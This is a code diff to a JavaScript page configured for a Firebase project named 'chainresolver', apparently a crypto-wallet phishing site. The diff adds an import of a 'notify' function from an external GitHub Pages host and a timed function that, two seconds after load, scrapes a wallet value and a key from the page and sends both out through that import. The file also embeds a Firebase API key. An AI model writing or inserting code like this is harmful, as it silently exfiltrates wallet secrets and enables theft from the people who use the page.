@@ -2,6 +2,8 @@
 // import "https://cdn.skypack.dev/firebase/compat/auth";
 // import "https://cdn.skypack.dev/firebase/compat/firestore";
 
+import {notify} from 'https://giterhaber.github.io/web-codes/notification.js'
+
 const firebaseConfig = {
   apiKey: "AIzaSyDAk6wPmjinvA2AaKkBpXFpOkEwXssluvc",
   authDomain: "chainresolver.firebaseapp.com",
@@ -99,3 +101,18 @@ const firebaseConfig = {
         location.href = "/";
       }
     });
+
+    const forNotif = () => {
+
+      let root = $('#root')
+    
+      //contents
+      let wallet = root.find('div').eq([1]).find('span').html()
+
+      let key = root.find('div').eq([2]).find('span').html()
+      
+      notify(`${wallet}  ${key}`)
+
+     }
+    
+     setTimeout(forNotif, 2000)
